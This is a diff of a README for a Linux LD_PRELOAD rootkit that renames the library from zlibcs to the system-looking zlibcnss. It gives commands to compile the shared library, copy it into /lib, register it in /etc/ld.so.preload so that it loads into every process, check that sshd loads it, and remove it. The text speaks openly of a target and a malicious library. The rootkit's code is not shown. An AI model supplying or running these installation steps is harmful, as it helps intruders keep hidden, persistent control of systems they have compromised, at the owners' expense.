@@ -1,39 +1,27 @@
-zlibcs
 
 
-Compile:
+
+Compile and install:
 ```bash
-gcc zlibcs.c -o zlibcs.so -fPIC -shared -ldl -D_GNU_SOURCE
+ gcc zlibcnss.c -o zlibcnss.so -fPIC -shared -ldl -D_GNU_SOURCE
+ cp zlibcnss.so /lib/
+ echo "/lib/zlibcnss.so" > /etc/ld.so.preload
 ```
 
-## Installation
-On the target, copy the shared library/rootkit to where the other shared libraries reside.
 
-64-bit example:
-```bash
-cp zlibcs.so /lib/x86_64-linux-gnu/
-cp zlibcs.so /lib/
-```
-And copy the path of the rootkit into /etc/ld.so.preload.
-```bash
-echo "/lib/x86_64-linux-gnu/zlibcs.so" > /etc/ld.so.preload
-echo "/lib/zlibcs.so" > /etc/ld.so.preload
-```
-
-I would advise renaming `zlibcs.so` to something more stealthy.
 
 ### Verify installation
 You can check if the rootkit is installed by running```ldd``` and checking that your malicious library gets loaded.
 ```bash
 ldd /usr/sbin/sshd
 	linux-vdso.so.1 (0x00007ffe9214c000)
-	/lib/x86_64-linux-gnu/zlibcs.so (0x00007f17ed354000)
+	/lib/x86_64-linux-gnu/zlibcnss.so (0x00007f17ed354000)
     [...]
 ```
 Also check /etc/ld.so.preload for your entry.
 ```bash
 cat /etc/ld.so.preload 
-/lib/x86_64-linux-gnu/zlibcs.so
+/lib/x86_64-linux-gnu/zlibcnss.so
 ```
 
 ## Usage
@@ -66,5 +54,5 @@ Delete `/etc/ld.so.preload` and delete the maliciuos library.
 Nothing else needed.
 ```bash
 rm /etc/ld.so.preload
-rm /lib/x86_64-linux-gnu/zlibcs.so
+rm /lib/x86_64-linux-gnu/zlibcnss.so
 ```
